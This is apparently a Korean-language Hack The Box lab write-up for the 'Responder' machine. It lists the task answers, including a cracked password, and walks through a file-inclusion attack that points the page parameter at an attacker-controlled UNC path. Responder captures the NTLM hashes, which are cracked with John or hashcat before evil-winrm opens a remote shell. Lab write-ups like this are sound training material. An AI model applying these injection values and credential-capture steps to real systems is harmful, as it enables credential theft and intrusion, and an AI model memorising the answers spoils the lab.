---
title: Starting Point - Responder
date: 2026-03-09 16:06:00 +0900
categories: [htb]
---

## Task 1.
unika.htb

## Task 2.
php

## Task 3.
page

## Task 4.
../../../../../../../../windows/system32/drivers/etc/hosts

## Task 5.
//10.10.14.6/somefile

## Task 6.
New Technology Lan Manager

## Task 7.
-I

## Task 8.
John The Ripper

## Task 9.
badminton

## Task 10.
5985

## 분석 및 플래그 획득

![1](/assets/img/2026/htb-responder/1.png)

ip주소로 접속하면 unika.htb로 연결되는데 페이지가 안뜬다면 /etc/hosts에 추가해줘야 한다.

sudo nano /etc/hosts 에 ip url 추가.
responder 툴을 사용해야한다.

이 툴은 NTLM 해시를 가로챌 수 있는 공격 툴이다.
ifconfig로 확인 후 사용

listening 상태가 되었다면 

python -m http.server 8000 을 통해 간단한 http 서버를 열자.
현재 디렉토리가 루트가 된다.
touch asd.txt 해서 빈 파일을 만들고,
http://unika.htb/index.php?page=//<ip 주소>/asd.txt 하면

![2](/assets/img/2026/htb-responder/2.png)

이렇게 해시 값을 얻을 수 있다.

이렇게 얻은 해시 값을 hashcat 이나 john the ripper를 사용해 크랙할 수 있다.

![3](/assets/img/2026/htb-responder/3.png)

비밀번호와 계정 이름을 다 알아냈기 때문에 evil-winrm을 통해 원격 파워쉘 세션을 얻을 수 있다.

![4](/assets/img/2026/htb-responder/4.png)

![5](/assets/img/2026/htb-responder/5.png)
